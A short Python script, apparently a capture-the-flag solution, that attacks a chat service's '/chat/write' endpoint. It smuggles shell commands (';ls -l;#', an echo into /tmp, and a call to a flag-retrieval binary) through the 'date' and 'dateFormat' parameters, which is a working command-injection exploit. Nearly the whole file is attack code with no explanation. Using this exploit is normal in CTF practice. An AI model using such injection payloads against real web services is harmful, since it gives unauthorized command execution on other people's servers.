#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
~Gros
'''


import requests
import uuid

from config import url_task2 as url
from config import proxies


def do_exec(payload):
    resp = requests.get(url+'/chat/write',
                        params={'msg': 'test solve', 'nick': 'X',
                        'date': payload[1], 'dateFormat':payload[0]},
                        proxies=proxies)
    print(resp.text)


if __name__ == "__main__":
    # payload = ["%H\\", ";ls -l;#"]
    # do_exec(payload)

    unique_filename = str(uuid.uuid4())
    prefix = "%H\\"
    payload1 = ";echo -e 'gimme flag' > /tmp/" + unique_filename + ";#"
    payload2 = ";./flag_bin/get_flag '--cast spell'</tmp/" + unique_filename  + ";#"

    do_exec([prefix, payload1])
    do_exec([prefix, payload2])
